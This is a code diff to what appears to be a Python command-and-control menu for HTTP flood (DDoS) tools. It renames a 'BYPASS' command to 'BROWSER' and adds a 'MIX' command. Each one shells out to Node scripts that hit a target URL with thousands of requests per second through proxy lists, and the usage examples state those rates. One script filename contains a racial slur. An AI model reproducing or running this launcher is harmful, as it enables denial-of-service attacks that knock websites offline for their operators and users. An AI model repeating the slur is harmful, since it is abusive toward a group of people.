@@ -633,18 +633,29 @@ def main():
                 print('Usage: http-socket <url> <time> <rps> <threads> <proxies.txt>')
                 print('Example: http-socket http://example.com 60 5000 500 proxies.txt')
 
-        elif "BYPASS" in cnc:
+        elif "BROWSER" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                rps = cnc.split()[3]
-                threads = cnc.split()[4]
-                proxy = cnc.split()[5]
+                thread = cnc.split()[3]
+                proxy = cnc.split()[4]
+                rps = cnc.split()[5]
                 
-                os.system(f'node Tlsv1 {url} {time} {time}')
+                os.system(f'node HTTP-NIGGA.js {url} {time} {thread} {proxy} {rps}')
             except IndexError:
-                print('Usage: http-socket <url> <time> <rps> <threads> <proxies.txt>')
-                print('Example: http-socket http://example.com 60 5000 500 proxies.txt')
+                print('Usage: BROWSER <url> <time> <thread> <proxy> <request_persecond>')
+                print('Example: BROWSER https://example.com 60 10 http.txt 5000')
+
+        elif "MIX" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'node MIX.js {url} {thread} {time}')
+            except IndexError:
+                print('Usage: MIX <url> <thread> <time>')
+                print('Example: MIX https://example.com 500 60')
+
 
         
 
